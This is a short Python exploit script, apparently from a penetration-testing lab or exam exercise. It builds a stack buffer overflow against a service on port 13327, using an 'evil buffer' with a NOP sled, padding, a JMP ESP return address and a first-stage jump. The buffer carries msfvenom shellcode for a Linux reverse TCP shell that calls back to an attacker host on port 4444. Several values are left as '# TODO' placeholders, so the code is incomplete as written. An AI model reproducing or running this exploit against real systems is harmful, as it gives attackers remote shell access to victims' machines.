#!/usr/bin/python3
import socket

host = "192.168.221.44"

#msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.119.221 LPORT=4444 EXITFUNC=thread -b "\x00\x20" -f python -v shellcode                           

shellcode =  b""
shellcode += b"\xdb\xc7\xd9\x74\x24\xf4\xbf\x91\x3d\xe7\x55"
shellcode += b"\x5a\x2b\xc9\xb1\x12\x31\x7a\x17\x83\xc2\x04"
shellcode += b"\x03\xeb\x2e\x05\xa0\x3a\x8a\x3e\xa8\x6f\x6f"
shellcode += b"\x92\x45\x8d\xe6\xf5\x2a\xf7\x35\x75\xd9\xae"
shellcode += b"\x75\x49\x13\xd0\x3f\xcf\x52\xb8\x7f\x87\xd2"
shellcode += b"\xe5\xe8\xda\x1c\x04\xb5\x53\xfd\x96\x23\x34"
shellcode += b"\xaf\x85\x18\xb7\xc6\xc8\x92\x38\x8a\x62\x43"
shellcode += b"\x16\x58\x1a\xf3\x47\xb1\xb8\x6a\x11\x2e\x6e"
shellcode += b"\x3e\xa8\x50\x3e\xcb\x67\x12"

nop_sled = b"\x90" * 20

length = # TODO 4379
offset = # TODO 4368

padding = b""
padding += b"\x41" * (offset - len(shellcode) - len(nop_sled) ) #* (offset - len(badchars))

# JMP ESP 
# LITTLE ENDIAN!!!
eip = # TODO b"\x96\x45\x13\x08"

# msf-nasm_shell
#nasm > add eax,12
#00000000  83C00C            add eax,byte +0xc
#nasm > jmp eax
#00000000  FFE0              jmp eax
# len: 83 co 0c ff e0 -> 5 Bytes
first_stage = b"\x83\xc0\x0c\xff\xe0"
len_first_stage = 5

buffer = b"\x11(setup sound " + nop_sled + shellcode + padding + eip + first_stage + b"\x90" * (length - offset - 4 - len_first_stage) + b"\x90\x00#"

print(buffer)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print("[*]Sending evil buffer...")

s.connect((host, 13327))
print(s.recv(1024))
# s.send(bytes(buffer, "latin-1"))
s.send(buffer)

s.close()

print("[*]Payload Sent !")